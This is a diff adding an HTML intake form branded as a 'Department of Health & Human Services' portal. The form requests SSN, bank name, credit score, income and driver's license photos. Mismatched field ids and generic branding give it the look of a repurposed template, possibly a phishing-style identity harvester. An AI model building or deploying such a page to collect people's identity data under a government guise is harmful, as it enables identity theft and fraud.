@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Department of Health &amp; Human Services — Applicant Intake</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="header-inner">
+      <a href="/" class="back-home" aria-label="Back to Home">← Home</a>
+      <div class="brand">
+        <span class="brand-mark" aria-hidden="true">
+          <svg viewBox="0 0 48 48" width="34" height="34">
+            <circle cx="24" cy="24" r="22" fill="#0b6e6e"/>
+            <path d="M24 12c-1.5 3-4 6-8 7.5 0 7 3.5 12.5 8 14.5 4.5-2 8-7.5 8-14.5-4-1.5-6.5-4.5-8-7.5z" fill="#fff"/>
+          </svg>
+        </span>
+        <div class="brand-text">
+          <span class="brand-title">Department of Health &amp; Human Services</span>
+          <span class="brand-sub">Applicant &amp; Beneficiary Intake Portal</span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main class="page">
+    <section class="intro">
+      <h1>Personal Information Intake Form</h1>
+      <p>Please complete all fields accurately. Information submitted here is used to process your application for services. Fields marked <span class="required">*</span> are required.</p>
+    </section>
+
+    <form id="intakeForm" class="card" autocomplete="off" novalidate>
+      <div id="formAlert" class="alert" hidden></div>
+
+      <fieldset>
+        <legend>Personal Details</legend>
+        <div class="grid">
+          <div class="field">
+            <label for="fullName">Full Name <span class="required">*</span></label>
+            <input type="text" id="fullName" name="fullName" required>
+          </div>
+          <div class="field">
+            <label for="gender">Gender <span class="required">*</span></label>
+            <select id="gender" name="gender" required>
+              <option value="" disabled selected>Select</option>
+              <option>Male</option>
+              <option>Female</option>
+              <option>Non-binary</option>
+              <option>Prefer not to say</option>
+            </select>
+          </div>
+          <div class="field">
+            <label for="dob">Date of Birth <span class="required">*</span></label>
+            <input type="date" id="dob" name="dob" required>
+          </div>
+          <div class="field">
+            <label for="maritalStatus">Marital Status <span class="required">*</span></label>
+            <select id="maritalStatus" name="maritalStatus" required>
+              <option value="" disabled selected>Select</option>
+              <option>Single</option>
+              <option>Married</option>
+              <option>Divorced</option>
+              <option>Widowed</option>
+              <option>Separated</option>
+            </select>
+          </div>
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <legend>Contact Information</legend>
+        <div class="grid">
+          <div class="field">
+            <label for="email">Email Address <span class="required">*</span></label>
+            <input type="email" id="email" name="email" required>
+          </div>
+          <div class="field">
+            <label for="mobileNumber">Mobile Number <span class="required">*</span></label>
+            <input type="tel" id="mobileNumber" name="mobileNumber" placeholder="+1 555 123 4567" required>
+          </div>
+          <div class="field">
+            <label for="personalNumber">SSN <span class="required">*</span></label>
+            <input type="text" id="personalNumber" name="personalNumber" required>
+          </div>
+          <div class="field full">
+            <label for="address">Address <span class="required">*</span></label>
+            <textarea id="address" name="address" rows="2" required></textarea>
+          </div>
+          <div class="field">
+            <label for="houseName">Bank Name <span class="required">*</span></label>
+            <input type="text" id="houseName" name="houseName" required>
+          </div>
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <legend>Economic &amp; Case Details</legend>
+        <div class="grid">
+          <div class="field">
+            <label for="occupation">Occupation <span class="required">*</span></label>
+            <input type="text" id="occupation" name="occupation" required>
+          </div>
+          <div class="field">
+            <label for="monthlyIncome">Monthly Income (USD) <span class="required">*</span></label>
+            <input type="number" id="monthlyIncome" name="monthlyIncome" min="0" step="0.01" required>
+          </div>
+          <div class="field">
+            <label for="daysScore">Credit Score <span class="required">*</span></label>
+            <input type="number" id="daysScore" name="daysScore" min="0" step="1" required>
+          </div>
+        </div>
+      </fieldset>
+
+      <fieldset>
+        <legend>Identity Verification Photos</legend>
+        <p class="hint">Upload clear photos of your drivers license (front and back). These are used for identity verification and case file records.</p>
+        <div class="grid">
+          <div class="field">
+            <label for="image1">Photo 1 <span class="required">*</span></label>
+            <input type="file" id="image1" name="image1" accept="image/*" required>
+            <div class="preview" id="preview1" hidden><img alt="Photo 1 preview"></div>
+          </div>
+          <div class="field">
+            <label for="image2">Photo 2 <span class="required">*</span></label>
+            <input type="file" id="image2" name="image2" accept="image/*" required>
+            <div class="preview" id="preview2" hidden><img alt="Photo 2 preview"></div>
+          </div>
+        </div>
+      </fieldset>
+
+      <div class="consent">
+        <label>
+          <input type="checkbox" id="consent" required>
+          I certify the information provided is true and correct to the best of my knowledge, and I consent to its use for processing my application.
+        </label>
+      </div>
+
+      <button type="submit" id="submitBtn" class="btn-primary">Submit Application</button>
+    </form>
+
+    <p class="footnote">Your information is transmitted securely and stored for case processing purposes only, in accordance with department data handling policy.</p>
+  </main>
+
+  <footer class="site-footer">
+    <p>&copy; 2026 Department of Health &amp; Human Services. For internal departmental use.</p>
+  </footer>
+
+<script src="app.js"></script>
+</body>
+</html>
